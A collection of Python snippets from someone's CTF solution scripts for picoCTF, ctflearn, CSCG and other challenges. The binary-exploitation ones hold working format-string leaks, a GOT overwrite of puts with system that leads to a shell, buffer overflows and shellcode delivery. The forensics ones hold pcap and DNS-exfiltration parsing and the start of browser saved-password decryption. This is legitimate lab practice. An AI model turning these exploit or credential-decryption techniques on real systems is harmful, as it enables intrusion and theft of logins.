	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def re_match_flag(self, text: str, origin: str) -> list[str]:
        """
        Description:
        Find the flag in the text

        Args:
            text (str): Text to search for the flag
            origin (str): Origin of the flag

        Returns:
            str: list of flag found in the text
        """
        flag_pattern = rf"{origin}{{[A-Za-z0-9_]+}}"
        return re.findall(flag_pattern, text)

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, "picoCTF")[0]
        print(flag)

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def exploitation(self):
        self.initiate_connection()
        self.recv_menu(4)
        self.conn.sendline(b"1")
        self.conn.recvuntil(b"What is your API token?\n")
        self.conn.sendline(b"%p" * 24)
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def to_hex(self, data):
        if type(data) == str:
            return "".join([hex(ord(c)) for c in data])
        return "".join([hex(ord(c))[2:] for c in data])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def from_hex(self, data):
        return "".join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def data_processing(self, data):

        output = "".join(data.split("(nil)"))

        output = output.strip("0x").split("0x")
        temp = []

        for item in output:
            temp_word = ""
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = "".join(output)
        return output

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def local_run(self):
        data = "0x9cc74100x804b0000x80489c30xf7ec6d800xffffffff0x10x9cc51600xf7ed41100xf7ec6dc7(nil)0x9cc61800x10x9cc73f00x9cc74100x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x633432610x366134310xff87007d"
        return data

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, "picoCTF")[0]
        print(flag)

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.prepare_space()
        # self.pwn.context.log_level = "critical"
        self.pwn.context.binary = self.pwn.ELF(Path(self.folder_files, self.file))
        self.initiate_connection()

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def exec_fmt(self, payload):
        p = CTFSolver(conn=self.conn_type, file=self.file, url=self.url, port=self.port)
        p.initiate_connection()
        p.conn.sendline(payload)
        return p.conn.recvall()

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def main(self):
        print(self.conn.recvline())

        # This uses the exec_fmt, autofmt in the documentation to find the offset for the payload.
        # To find the address objump -D vuln was used on the binary executable file.
        # When searching for the function "sus" these lines could be seen.z

        autofmt = self.pwn.FmtStr(self.exec_fmt)
        offset = autofmt.offset
        print(f"Offset: {offset}")

        payload = self.pwn.fmtstr_payload(offset, {0x404060: 0x67616C66})
        self.conn.sendline(payload)

        print(self.conn.recvall())

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        self.prepare_space(files=["flag.txt"], folder=self.folder_files)

        self.pwn.context.binary = self.binary = self.pwn.ELF(
            self.challenge_file, checksec=True
        )

        self.library = Path(self.folder_files, "libc.so.6")

        self.libc = self.pwn.ELF(self.library, checksec=False)

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def exec_func(self, payload):
        p = Solution(conn="local", file=self.file)
        p.initiate_connection()
        p.conn.sendline(payload)
        p.conn.recvline()
        p.conn.recvline()
        res = p.conn.recvline()
        print(res)
        return res.strip()

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def main(self):

        fmtstr = self.pwn.FmtStr(self.exec_func)
        super().initiate_connection()
        self.conn.recvuntil("libc: ")
        setvbuf = int(self.conn.recvline().strip().decode(), 16)

        self.libc.address = setvbuf - 0x7A3F0

        payload = b"A" * fmtstr.padlen + self.pwn.fmtstr_payload(
            fmtstr.offset, {self.binary.got.puts: self.libc.symbols.system}
        )

        self.conn.sendline(payload)

        self.conn.interactive()

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_0/payloads/solution.py
    def main(self):
        for _ in range(20):
            # print(self.conn.recvline())
            self.conn.recvline()

        print(self.conn.recvuntil(b"Enter your choice: "))

        self.conn.sendline(b"2")

        print(self.conn.recvuntil(b"Data for buffer: "))

        payload = "A" * 32
        print(payload)

        self.conn.sendline(payload)

        for _ in range(7):
            # print(self.conn.recvline())
            self.conn.recvline()

        print(self.conn.recvuntil(b"Enter your choice: "))

        # # To check it
        # self.conn.sendline(b"3")

        # print(self.conn.recvuntil(b"Enter your choice: "))

        # # To check it
        # self.conn.sendline(b"1")

        # print(self.conn.recvuntil(b"Enter your choice: "))

        self.conn.sendline(b"4")

        print(self.conn.recvall())

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def __init__(self, **kwargs) -> None:
        self.get_parent()
        self.prepare_space()
        super().__init__(**kwargs)

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def prepare_space(self):
        files = [
            "secret-menu-item-1.txt",
            "secret-menu-item-2.txt",
            "flag.txt",
        ]
        for file in files:
            with open(Path(self.folder_payloads, file), "w") as f:
                f.write("picoCTF{test}")

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def main(self):
        # print(self.file)
        print(self.conn.recvline())
        self.conn.sendline(
            b"%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p"
        )
        print(self.conn.recvline())
        print(self.conn.recvline())

	# /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def generate_pattern(self, length=1, n=8):
        """
        Generates a cyclic pattern of a given length.

        Args:
            length (int): The length of the pattern to generate.
            n (int): The number of unique characters in the pattern.

        Returns:
            str: The generated cyclic pattern.
        """
        return self.pwn.cyclic(length=length, n=n)

	# /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def find_offset(self, pattern, n=8):
        """
        Finds the offset of a given pattern in the cyclic pattern.

        Args:
            pattern (str): The pattern to find the offset for.
            n (int): The number of unique characters in the pattern.

        Returns:
            int: The offset of the pattern.
        """
        return self.pwn.cyclic_find(pattern, n=n)

	# /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def main(self):
        offset = self.local_exploitation()

        # Here is a slight problem that the offset is different than the one that gef gives
        payload = b"A" * offset + b"\xef\xbe\xad\xde"

        self.remote_exploitation(payload)

	# /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def local_exploitation(self):
        """
        Performs local exploitation to find the offset.

        Returns:
            int: The offset found from the local exploitation.
        """
        local = CTFSolver(conn="local", file=self.file, url=self.url, port=self.port)
        local.initiate_connection()

        # Header
        local.recv_lines(number=19, display=False)
        # Two sentence message
        local.recv_lines(number=2, display=False)

        payload = self.generate_pattern(length=300)
        print(f"Pattern: {payload}")

        # Sending payload
        local.send(payload, encode=False)

        output = local.recv_lines(number=2, save=True)

        rpb = str(output[0]).replace("\\n", "").split("==")[1].strip().strip("'")
        print(rpb)
        crash_value = int(rpb, 16)
        offset = self.find_offset(crash_value)
        print(f"Offset: {offset}")
        return offset

	# /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def remote_exploitation(self, payload):
        """
        Performs remote exploitation using the given payload.

        Args:
            payload (bytes): The payload to use for remote exploitation.
        """
        remote = CTFSolver(conn="remote", file=self.file, url=self.url, port=self.port)
        remote.initiate_connection()

        # Header
        remote.recv_lines(number=19, display=False)
        # Two sentence message
        remote.recv_lines(number=2, display=True)

        # Sending payload
        remote.send(payload, encode=False)

        remote.recv_lines(number=3, display=True)

	# /home/figaro/CTF/Categories/Binary/picoCTF/basic-file-exploit/payloads/solution.py
    def main(self):
        self.initiate_connection()

        self.menu_text = ""
        self.menu_num = 4

        self.recv_lines(number=self.menu_num, display=True)
        self.send("1")
        self.recv_lines(number=2, display=True)
        self.send("1")
        self.recv_lines(number=2, display=True)
        self.send("1")
        self.recv_lines(number=3, display=True)
        self.send("2")
        self.recv_lines(number=2, display=True)
        self.send("0")
        self.recv_lines(number=2, display=True)

	# /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.menu_num = 0
        self.menu_text = "Enter the address in hex to jump to, excluding '0x': "
        self.local_preparations()
        self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

	# /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def local_preparations(self):
        if self.conn == "remote":
            return
        self.challenge_file = self.Path(self.parent, "challenge", self.file)
        self.folder_challenge = self.Path(self.parent, "challenge")
        self.prepare_space(
            files=["flag.txt"],
            folder=self.folder_challenge,
        )

	# /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def get_address(self, function):
        address = self.elf.symbols[function]
        # process address
        return address

	# /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def main(self):

        win_address = self.get_address("win")

        payload = str(hex(win_address)).split("0x")[1]
        self.send_menu(choice=payload)

        flag = self.recv_menu(number=3, display=True, save=True)[2]
        flag = flag.decode("utf-8").strip("\n").strip(" ")
        print(flag)

	# /home/figaro/CTF/Categories/Binary/picoCTF/filtered-shellcode/payloads/solution.py
    def load_shellcode(self):
        shellcode = ""
        exploit_filed = self.folfil(folder="payloads", file="exploit.asm")
        with open(exploit_filed, "r") as f:
            shellcode = f.read()

        shellcode = self.pwn.asm(shellcode)
        print(shellcode)

        return shellcode

	# /home/figaro/CTF/Categories/Binary/picoCTF/filtered-shellcode/payloads/solution.py
    def main(self):

        self.menu_num = 0
        self.menu_text = "Give me code to run:"
        shellcode = self.load_shellcode()
        self.initiate_connection()
        self.recv_until("run:")
        # Note: fix send to be able to send text without encoding it
        # self.send(shellcode)
        self.conn.sendline(shellcode)
        self.conn.interactive()

	# /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def get_elf_function_address(self, function):
        """
        Description:
        """
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

	# /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def challenge_get_offset_address(self):
        offset = self.get_elf_function_address("main") - self.get_elf_function_address(
            "win"
        )
        return offset

	# /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def main(self):
        self.initiate_connection()
        self.elf = None
        main_function = self.recv_lines(1, display=False, save=True)[0]

        main_function = main_function.split(b" ")[-1].decode("utf-8").strip("\n")
        main_function = int(main_function, 16)

        win_addr = main_function - self.challenge_get_offset_address()

        menu_text = "Enter the address to jump to, ex => 0x12345: "
        self.recv_send(
            text=hex(win_addr), text_until=menu_text, save=True, display=True
        )

        result = self.recv_lines(3, display=True, save=True)[-1]

        flag = self.re_match_partial_flag(
            text=result.decode("utf-8"), origin="picoCTF{"
        )

        pyperclip.copy(flag[0])

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def __init__(self, **kwargs) -> None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=["flag.txt"], folder=self.folder_files, test_text="picoCTF{test}"
        )
        self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def get_address(self):
        # win = self.elf.symbols["win"]
        # self.win_address = hex(win)
        self.win_address = self.elf.symbols["win"]
        self.win_address = hex(self.win_address)

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def build_payload(self):
        self.payload = b"A" * 32
        self.get_address()
        length = len(hex(self.win_address)) - 2
        self.payload += self.pwn.p32(int(self.win_address, 16))
        self.payload += self.pwn.p32(self.win_address)
        # self.payload = self.payload[:-2]
        # self.payload += b"\x40"

        self.payload += struct.pack(">I", self.win_address)
        self.payload = self.payload[:-2]
        self.payload += b"\x40"

        length = (16 - length) // 2
        for _ in range(length):
            self.payload += b"\x00"

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def main(self):

        # self.build_payload()

        # return

        # Welcome message
        for _ in range(2):
            out = self.conn.recvline()
            # print(out)

        # Menu
        for _ in range(7):
            out = self.conn.recvline()
            # print(out)

        out = self.conn.recvuntil(b"Enter your choice: ")
        # print(out)

        self.conn.sendline(b"2")

        self.conn.recvuntil(b"Data for buffer: ")

        # self.payload = b"A" * 32 + b"\xa0\x11\x40\x00\x00\x00\x00\x00"
        self.payload = (
            b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00"
        )
        print(self.payload)
        self.conn.sendline(self.payload)
        print(self.conn.recvuntil(b"choice: "))

        # self.conn.sendline(b"3")
        # print(self.conn.recvuntil(b"choice: "))
        self.conn.sendline(b"4")
        print(self.conn.recvuntil(b"choice: "))

	# /home/figaro/CTF/Categories/Binary/ctflearn/Positive_Challenge/payloads/solution.py
    def main(self):
        self.initiate_connection()

        self.menu_num = 0
        self.menu_text = "Enter a number to add: "

        # self.send_menu(9999999999999999999999, display=True)
        # self.recv_lines(1, display=True)

        self.looper()

	# /home/figaro/CTF/Categories/Binary/ctflearn/Positive_Challenge/payloads/solution.py
    def looper(self):
        payload = "-1-1-2-3-4-5-6-7-8-9-10-11-12-13-14-15-16-17-1813-14-15-16-17-18---1"
        payload = "-1-1-1111111111111--11111111111111"

        times = 110
        for i in range(times):
            self.send_menu(payload)
            self.recv_lines(1, display=True)
        # self.recv_lines(10, display=True)
        # self.recv_lines(1, display=True)

        # # acc = self.recv_lines(1, save=True)[0]
        # # print(acc)

        # self.send_menu("1--1")

        self.recv_lines(times, display=True)

	# /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def main(self):
        self.prepare_space(
            files=["flag.txt"], folder=self.folders["files"], test_text="ctflean{test}"
        )
        self.menu_text = "What is your favorite format tag? "
        self.menu_num = 0

        addresses = self.read_address_positions(11)
        flag = self.decode_address(addresses, 7, 11)

	# /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def read_address_positions(self, positions):
        """
        Reads the address of the stack

        Args:
            positions (int): Number of positions to read

        Returns:
            list: List of addresses
        """
        # How to read a specific address
        payload = "%p " * positions
        output = self.simple_payload_send(payload)
        address_all = output.decode("utf-8").strip("\n").split(" ")

        return address_all

	# /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def decode_address(self, address_all, start=0, end=None):
        """
        Description:
            Decodes the address of the stack

        Args:
            address_all (list): List of addresses
            start (int, optional): Starting position of the address. Defaults to 0.
            end ([type], optional): Ending position of the address. Defaults to None.

        Returns:
            bytes: Decoded text of the address
        """
        decoded_text = b""

        if end is None:
            end = len(address_all)

        for i in range(start, end):
            decoded_text += self.pwn.p64(int(address_all[i], 16))
        return decoded_text

	# /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def simple_payload_send(self, payload, lines=1):
        """
        Description:
            Sends a simple payload to the connection

        Args:
            payload (str): Payload to send
            lines (int, optional): Number of lines to receive. Defaults to 1.

        Returns:
            bytes: Output of the connection
        """
        bruter = CTFSolver(conn="remote", url=self.url, port=self.port)
        bruter.initiate_connection()
        bruter.menu_text = self.menu_text
        bruter.menu_num = self.menu_num
        bruter.send_menu(choice=payload)
        output = bruter.recv_lines(lines, save=True)

        if len(output) > 0:
            return output[0]

	# /home/figaro/CTF/Categories/Binary/ctflearn/Two_Times_Sixteen/payloads/solution.py
    def main(self):
        self.initiate_connection(cwd=self.folders["data"])

	# /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.image_modified = Path(self.folder_data, "modified.jpg")
        self.copy(self.challenge_file, self.image_modified)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def modify_picture(self):
        image = Image.open(self.challenge_file.as_posix())

        exif_dict = piexif.load(image.info.get("exif", b""))
        # exif_dict = piexif.load(self.challenge_file)
        exif_bytes = piexif.dump(exif_dict)

        for k, v in exif_dict.items():
            print(k, v)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def copy(self, file1, file2):
        with open(file1, "rb") as f:
            data = f.read(2048 * 2048)
            with open(file2, "wb") as f2:
                f2.write(data)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def main(self):
        self.modify_picture()

	# /home/figaro/CTF/Categories/Forensics/picoCTF/PcapPoisoning/payloads/solution.py
    def searching_packets(self, packets, text):
        for i, packet in enumerate(packets):
            if packet.haslayer("Raw"):
                if text.encode() in packet["Raw"].load:
                    print(f"Found {text} in packet {i}")
                    print(packet.show())
                    print(packet.summary())
                    return packet["Raw"].load.decode("utf-8")

	# /home/figaro/CTF/Categories/Forensics/picoCTF/PcapPoisoning/payloads/solution.py
    def main(self):
        self.packets = rdpcap(self.challenge_file.as_posix())
        flag = self.searching_packets(self.packets, "pico")
        print(flag)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/hideme/payloads/solution.py
    def extract_files_from_binary(self, filepath):
        binwalk_obj = binwalk.Binwalk()

        results = binwalk_obj.scan(filepath)

        if not results:
            print("No files found")
            return

        for result in results:
            if result.extracted:
                print(f"Extracted {result.file.path}")
                for extracted_file in result.extracted:
                    print(f"Extracted {extracted_file}")
            else:
                print(f"Could not extract {result.file.path}")

	# /home/figaro/CTF/Categories/Forensics/picoCTF/hideme/payloads/solution.py
    def main(self):
        # self.extract_files_from_binary(self.challenge_file)
        pass

	# /home/figaro/CTF/Categories/Forensics/picoCTF/endianness_v2/payloads/solution.py
    def hexdump_to_binary(self, hexdump_file, binary_file):
        with open(hexdump_file, "rb") as f:
            hexdump_data = f.read()

        hex_data = []

        for i in range(0, len(hexdump_data), 4):
            chunk = hexdump_data[i : i + 4]
            # If the chunk is less than 4 bytes, pad it with zeros
            if len(chunk) < 4:
                # chunk += b"\x00" * (4 - len(chunk))
                chunk = chunk.ljust(4, b"\x00")
            hex_data.append(f"{struct.unpack('<I', chunk)[0]:08x}")

        hex_output = "".join(hex_data)

        binary_output = binascii.unhexlify(hex_output)

        with open(binary_file, "wb") as f:
            f.write(binary_output)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/endianness_v2/payloads/solution.py
    def main(self):
        self.lastfile = Path(self.folder_data, "lastfile")
        self.hexdump_to_binary(self.challenge_file, self.lastfile)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/Ph4nt0m_1ntrud3r/payloads/solution.py
    def main(self):
        packets = rdpcap(self.challenge_file.as_posix())
        result = {}
        for packet in packets:
            if packet.haslayer("Raw") and packet["Raw"].load is not None:
                result[str(packet.time)] = packet["Raw"].load

        print(result)

        sorted_keys = sorted(result.keys())
        flag = ""
        for key in sorted_keys:
            if key >= "1741231916.092334":
                flag += self.decode_base64(result[key].decode("utf-8"))

        pyperclip.copy(flag)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def differ(self):
        self.list_1_file = self.folfil("files", "list.txt")
        self.list_2_file = self.folfil("files", "html_list_2.txt")

        # Read the first list
        with open(self.list_1_file, "r") as f:
            self.list_1 = f.read().splitlines()

        # Read the second list
        with open(self.list_2_file, "r") as f:
            self.list_2 = f.read().splitlines()

        # Get the difference between the two lists
        diff = list(set(self.list_1) - set(self.list_2))
        # Print the difference
        print(diff)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def download_images(self, name):
        url = f"{self.url}:{self.port}/flags/{name}.png"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                flags_path = self.folfil("files", "flags")
                file_path = self.Path(flags_path, f"{name}.png")
                with open(file_path, "wb") as f:
                    f.write(response.content)
                print(f"Downloaded {name}.png")
            else:
                print(f"Error downloading {name}.png")
        except Exception as e:
            print(f"Error downloading {name}.png")
            print(e)

	# /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def main(self):
        lst = itertools.product(string.ascii_lowercase, repeat=3)
        lst = list(map(lambda x: "".join(x), lst))

        # for name in lst:
        #     self.download_images(name)

        self.download_images("upz")

	# /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def print_to_File(self, data, verbose=False, file_name="output.txt"):

        if verbose:
            print(data)
        with open(self.folfil("data", file_name), "a") as f:
            f.write(data + "\n")

	# /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def reassemblying_dns(self, packets=None):
        if packets is None:
            packets = self.packets

        hex_parts = []

        dns_packets = []
        for packet in packets:
            # if packet.haslayer("DNS") and packet["DNS"].qr == 0:  # DNS query
            #     query_name = packet["DNS"].qd.qname.decode("utf-8").strip(".")
            #     dns_packets.append(query_name)

            if packet.haslayer(DNSQR):
                qname = packet[DNSQR].qname.decode()
                qname = packet[DNSQR].qname.decode(errors="ignore").strip(".")

                # Extract the first label (before the first dot)
                # part = qname.split(".")[0]
                labels = qname.split(".")
                for part in labels:
                    # Must be even-length hex and not too short
                    if re.fullmatch(r"[a-fA-F0-9]{2,}", part) and len(part) % 2 == 0:
                        if part not in hex_parts:
                            hex_parts.append(part)

        hex_data = "".join(hex_parts)
        try:
            exfiltrated_data = bytes.fromhex(hex_data).decode("utf-8")

            with open(self.folfil("data", "exfiltrated.txt"), "w") as f:
                f.write(exfiltrated_data)

        except ValueError:
            exfiltrated_data = "Invalid hex data"

        return exfiltrated_data

	# /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def breakfiles(self, exfiltrated_data):

        lines = []
        counter = 0
        delimiters = [
            "From",
            "UEsDBg",
            "--boundary_AA",
            "UEsDBg",
            "Content-Transfer-Encoding: base64",
        ]

        for line in exfiltrated_data.splitlines():
            if line.startswith(tuple(delimiters)):
                lines.append([])
                counter += 1
            if line != "\n":
                lines[counter - 1].append(line)

        for i in range(1, counter + 1):
            with open(self.folfil("data", f"basefile_{i}.txt"), "w") as f:
                f.write("\n".join(lines[i - 1]))

	# /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def main(self):
        # self.pcap_open()
        self.packets = rdpcap(self.challenge_file.as_posix())
        data = self.reassemblying_dns()

        exfiltrated_file = self.folfil("data", "exfiltrated.txt")

        with open(exfiltrated_file, "r") as f:
            exfiltrated_data = f.read()

        self.breakfiles(exfiltrated_data)
        chosen_file = self.folfil("data", "basefile_2.txt")
        with open(chosen_file, "r") as f:
            base64_data = f.readlines()

        # Clean up the first two and last two  lines
        base64_data = [
            line.strip()
            for i, line in enumerate(base64_data)
            if i not in [0, 1, len(base64_data) - 1, len(base64_data) - 2]
        ]

        # Join and clean only base64 chars
        cleaned_data = "\n".join(base64_data)

        with open(self.folfil("data", "base64formated.txt"), "wb") as f:
            f.write(cleaned_data.encode("utf-8"))

	# /home/figaro/CTF/Categories/Forensics/bsides/Charter/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Forensics/CSCG/Somebody_Save_Me/payloads/solution.py
    def main(self):
        strings = self.extract_strings(self.challenge_file, min_length=20)

        strings_sorted = sorted(strings, key=len, reverse=True)
        # print(strings_sorted)

        base64_to_try = [2, 9, 12, 13]

        for i in base64_to_try:
            base64_strings = strings_sorted[i]

            decoded = self.decode_base64(base64_strings)
            if decoded is not None and "csc" in decoded:
                print(decoded)
                break

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def main(self):
        text = "mnzwg63ngrrxembvl42hem27oazxezrtmn2gy6k7myyw4m35"

        text = text.upper()
        print(text)

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def trying_to_exploit_ods(self):
        # Extract macros from the ODS file
        # macros = self.extract_macros_from_ods_initial()
        # Print the extracted macros

        files = self.list_all_files(self.challenge_file)
        # macros = self.extract_macros_with_odfpy(self.challenge_file)
        macros = self.extract_macros_with_odfpy(self.challenge_file, files)
        print(macros)

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_with_odfpy(self, ods_file, files):
        macros = []
        with zipfile.ZipFile(ods_file, "r") as z:
            for file in files:
                if file.endswith(".xml"):
                    with z.open(file) as f:
                        try:
                            # Parse the XML file
                            tree = ET.parse(f)
                            root = tree.getroot()

                            # Search for macro-related elements
                            for elem in root.iter():
                                if elem.tag.endswith("script"):
                                    macros.append(ET.tostring(elem, encoding="unicode"))

                        except ET.ParseError:
                            print(f"Error parsing {file}. Skipping...")

        if macros:
            # Pretty-print the extracted macros
            pretty_macros = [
                parseString(macro).toprettyxml(indent="  ") for macro in macros
            ]
            return "\n\n".join(pretty_macros)
        else:
            return "No macros found."

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def list_all_files(self, ods_file):
        """
        Lists all files in the ODS archive for manual inspection.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            list: A list of files inside the ODS archive.
        """
        with zipfile.ZipFile(ods_file, "r") as ods:
            return ods.namelist()

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_file(self, ods_file, file_name):
        """
        Extracts content from a specific file inside the ODS archive.

        Args:
            ods_file (str): Path to the ODS file.
            file_name (str): Name of the file inside the archive to extract.

        Returns:
            str: The content of the specified file.
        """
        try:
            with zipfile.ZipFile(ods_file, "r") as ods:
                with ods.open(file_name) as file:
                    return file.read().decode("utf-8")
        except Exception as e:
            return f"Failed to extract {file_name}: {e}"

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_ods(self, ods_file):
        """
        Attempts to extract macros from various files in the ODS archive.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            str: Extracted macros or debug information.
        """
        try:
            # List all files in the ODS archive
            all_files = self.list_all_files(ods_file)

            # Identify potential macro-related files
            macro_candidates = [
                f
                for f in all_files
                if "scripts" in f or "content" in f or "settings" in f
            ]

            macros = []
            for candidate in macro_candidates:
                content = self.extract_macros_from_file(ods_file, candidate)
                if "<script" in content or "<macro" in content:
                    macros.append(f"--- Content from {candidate} ---\n{content}")

            if macros:
                return "\n\n".join(macros)
            else:
                return "No explicit macros found. Check the file structure manually."

        except Exception as e:
            return f"An error occurred: {e}"

	# /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_ods_initial(self, ods_file=None):
        """
        Extracts macros from an ODS file.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            str: Extracted macros, if any, as plain XML text.
        """

        if ods_file is None:
            ods_file = self.challenge_file

        try:
            with zipfile.ZipFile(ods_file, "r") as ods:
                # List all files in the archive
                file_list = ods.namelist()

                # Look for possible macro-related files
                potential_files = [
                    f
                    for f in file_list
                    if f in ("content.xml", "scripts.xml", "settings.xml", "meta.xml")
                ]
                macros = []

                for file_name in potential_files:
                    with ods.open(file_name) as file:
                        xml_content = file.read()
                        root = ET.fromstring(xml_content)

                        # Search for common macro tags (e.g., <script>, <macro>)
                        for macro in root.iter():
                            if any(
                                keyword in macro.tag.lower()
                                for keyword in ("script", "macro")
                            ):
                                macros.append(ET.tostring(macro, encoding="unicode"))

                if macros:
                    return "\n\n".join(macros)
                else:
                    return "No macros found in the ODS file."

        except zipfile.BadZipFile:
            return "The provided file is not a valid ODS file."
        except ET.ParseError:
            return "Failed to parse XML content from the ODS file."
        except Exception as e:
            return f"An error occurred: {e}"

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def connecting_db(self):
        with sqlite3.connect(self.challenge_file) as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins"
            )
            return cursor.fetchall()

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def load_master_key(self):
        with open(self.Path(self.folder_files, "mkey.json"), "r") as mkey_file:
            mkey_data = json.load(mkey_file)
        master_key_id = list(mkey_data["masterkeys"].keys())[0]
        master_key = bytes.fromhex(mkey_data["masterkeys"][master_key_id])
        return master_key

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def main(self):
        with open(self.Path(self.folder_files, "Local_State")) as login_state:
            login_state = json.load(login_state)

        encrypted_key = login_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key)[2:-1]
        # decrypted_key = win32crypt.CryptUnprotectData(
        #     encrypted_key, None, None, None, 0
        # )[1]

